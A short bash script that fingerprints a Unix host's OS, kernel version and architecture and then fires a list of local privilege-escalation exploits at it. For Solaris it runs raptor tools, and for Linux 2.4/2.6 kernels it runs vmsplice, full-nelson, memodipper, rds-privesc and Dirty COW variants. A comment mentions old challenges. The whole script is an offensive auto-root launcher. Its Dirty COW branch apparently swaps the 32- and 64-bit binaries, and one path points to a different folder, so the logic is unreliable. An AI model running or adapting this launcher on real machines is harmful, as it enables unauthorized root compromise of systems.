#!/bin/bash


#set perms of exploits in folders
chmod +x solaris/*
chmod +x linux/*

# get info from server 
export OSTYPE=$(uname)
export KERNALRELEASE=$(uname -r)
export ARCH=$(uname -m)


echo "[+] OS Type - $OSTYPE"
echo "[+] Kernal - $KERNALRELEASE"
echo "[+] Architecture - $ARCH"
echo ""


# SOLARIS
if [[ $OSTYPE == *"SunOS"* ]]; then
	./solaris/raptor_libnspr;
	./solaris/raptor_libnspr2;
	./solaris/raptor_libnspr3;
	./solaris/raptor_solgasm;
	./solaris/raptor_ucbps;
fi



# LINUX
if [[ $OSTYPE == *"Linux"* ]]; then
	if [[ $KERNALRELEASE == *"2.6"* ]]; then
	./linux/ip_append_data;
	./linux/full-nelson;
	./linux/hoagie_udpsendmsg;
	./linux/k-rad3;
	./linux/linux-gate;
	./linux/mcast_msfilter;
	./linux/prctl_coredump;
	./linux/prctlpute;
	./linux/ptrace_pokeuser;
	./linux/rds-privesc;
	./linux/udev-141;
	./linux/vmsplice;
	./linux/vmsplice2;
	./linux/vmsplice3;
	./linux/memodipper;
	
	# memodipper, dirty cow1 + 2, others from old challenges.. maybe more than 1
	if [[ $ARCH == "x86_64" ]]; then
		./unix/cowroot32;
	else 
		./linux/cowroot64;
	fi
	
	
	
	fi
	if [[ $KERNALRELEASE == *"2.4"* ]]; then
		./linux/mcast_msfilter
		./linux/ptrace_pokeuser
		
	fi

fi
